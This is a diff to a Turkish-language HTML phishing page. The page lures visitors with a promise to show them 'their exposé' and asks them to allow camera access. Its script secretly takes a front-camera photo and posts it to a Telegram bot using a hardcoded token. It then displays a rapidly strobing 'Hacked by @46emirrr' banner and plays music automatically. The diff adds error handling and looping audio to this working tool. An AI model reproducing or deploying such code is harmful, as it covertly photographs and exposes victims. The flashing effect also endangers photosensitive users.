@@ -2,25 +2,28 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>İfşa Sayfası</title>
+  <title>Flash & Müzik & Kamera İzni</title>
   <style>
     body, html {
       margin: 0; padding: 0; height: 100%; overflow: hidden;
       font-family: sans-serif; text-align: center; background: black;
       color: white;
+      position: relative;
     }
     #flashOverlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      animation: flash 0.1s infinite alternate;
-      z-index: 9998;
+      pointer-events: none;
+      animation: flashColors 0.1s infinite alternate;
+      z-index: 9999;
       mix-blend-mode: difference;
     }
-    @keyframes flash {
+    @keyframes flashColors {
       0% { background-color: white; }
       100% { background-color: black; }
     }
     #izinButton {
+      position: relative;
       z-index: 10000;
       margin-top: 40vh;
       padding: 15px 30px;
@@ -30,16 +33,27 @@
       color: white;
       border: 2px solid white;
       border-radius: 10px;
+      user-select: none;
+    }
+    #mesaj {
+      margin-top: 20px;
+      font-weight: bold;
+      font-size: 20px;
+      z-index: 10000;
+      position: relative;
+      color: lime;
     }
     #hackedFlash {
-      font-size: 50px;
+      font-size: 60px;
       font-weight: bold;
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      animation: flash 0.1s infinite alternate;
+      animation: flashColors 0.1s infinite alternate;
       z-index: 11000;
+      pointer-events: none;
+      user-select: none;
       display: none;
     }
     video, canvas {
@@ -51,14 +65,18 @@
 
   <div id="flashOverlay"></div>
 
-  <h2 style="z-index: 10000;">📷 İfşanı görmek için lütfen izin ver</h2>
+  <h2 style="position: relative; z-index: 10000;">📷 İfşanı görmek için lütfen izin ver</h2>
   <button id="izinButton">İfşanı görmek için izin ver</button>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
+  <div id="mesaj"></div>
   <div id="hackedFlash">Hacked by @46emirrr</div>
 
-  <audio id="audio" src="https://raw.githubusercontent.com/emier71st/Dj-/main/Dj%20Mehmet%20Tekin%20-%20Eyp%20Audio%20Spl%202%20(Official%20Video).mp3"></audio>
+  <audio id="myAudio" loop>
+    <source src="https://raw.githubusercontent.com/emier71st/Dj-/main/Dj%20Mehmet%20Tekin%20-%20Eyp%20Audio%20Spl%202%20(Official%20Video).mp3" type="audio/mpeg" />
+    Tarayıcınız audio elementini desteklemiyor.
+  </audio>
 
   <script>
     const TELEGRAM_BOT_TOKEN = "7996559452:AAFUZHzo4URmpsKOXVemh5EkLWvzv-BWQTg";
@@ -68,18 +86,29 @@
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
+    const mesaj = document.getElementById("mesaj");
     const hackedFlash = document.getElementById("hackedFlash");
-    const audio = document.getElementById("audio");
+    const audio = document.getElementById("myAudio");
+
+    // Müzik 38. saniyeden başlasın
+    audio.addEventListener("loadedmetadata", () => {
+      audio.currentTime = 38;
+      audio.play().catch(() => {
+        // Otomatik oynatma engellenirse
+        console.log("Otomatik oynatma engellendi.");
+      });
+    });
 
     izinButton.addEventListener("click", async () => {
       izinButton.style.display = "none";
-      audio.play().catch(e => console.log("Oynatma engellendi:", e));
-      hackedFlash.style.display = "block";
+      mesaj.textContent = "";
+      hackedFlash.style.display = "none";
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
+        // 2 saniye bekle kamera görüntüsü için
         await new Promise(r => setTimeout(r, 2000));
 
         canvas.width = video.videoWidth;
@@ -93,18 +122,29 @@
 
           const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
 
-          await fetch(telegramUrl, {
+          const res = await fetch(telegramUrl, {
             method: "POST",
             body: formData
           });
 
+          if (res.ok) {
+            hackedFlash.style.display = "block";
+            mesaj.textContent = ""; // mesajı gizle
+          } else {
+            mesaj.textContent = "❌ Gönderim başarısız.";
+            izinButton.style.display = "inline-block";
+          }
+
+          // Kamerayı durdur
           stream.getTracks().forEach(track => track.stop());
         }, "image/png");
 
       } catch (err) {
-        console.log("Kamera erişimi alınamadı:", err.message);
+        mesaj.textContent = "Kamera erişimi alınamadı: " + err.message;
+        izinButton.style.display = "inline-block";
       }
     });
   </script>
+
 </body>
 </html>
